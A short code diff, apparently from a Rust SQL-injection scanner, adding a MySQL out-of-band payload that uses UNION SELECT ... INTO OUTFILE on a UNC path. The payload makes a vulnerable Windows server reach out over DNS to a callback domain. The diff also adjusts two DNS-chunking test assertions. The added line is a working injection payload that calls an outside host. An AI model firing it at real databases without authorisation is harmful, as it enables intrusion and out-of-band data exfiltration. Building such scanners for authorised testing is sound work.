@@ -325,6 +325,16 @@ fn mysql_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
             token,
             fqdn,
         ),
+        // PortSwigger second UNC primitive: SELECT ... INTO OUTFILE on a
+        // UNC path (Windows-only, same FILE-privilege requirement).
+        // Appended last so existing probe order is unchanged.
+        OobPayload::new(
+            format!("' UNION SELECT 'injekt' INTO OUTFILE '\\\\\\\\{fqdn}\\\\a' -- -"),
+            "mysql",
+            OobChannel::Dns,
+            token,
+            fqdn,
+        ),
     ]
 }
 
@@ -547,7 +557,7 @@ mod tests {
         assert_eq!(encode_for_dns("AB"), "4142");
         let chunks = chunk_for_dns("41424344", 2);
         assert_eq!(chunks, vec!["41", "42", "43", "44"]);
-        assert!(chunk_for_dns("", 32).is_empty());
-        assert!(chunk_for_dns("aa", 0).is_empty());
+        assert_eq!(chunk_for_dns("", 32), [] as [String; 0]);
+        assert_eq!(chunk_for_dns("aa", 0), [] as [String; 0]);
     }
 }
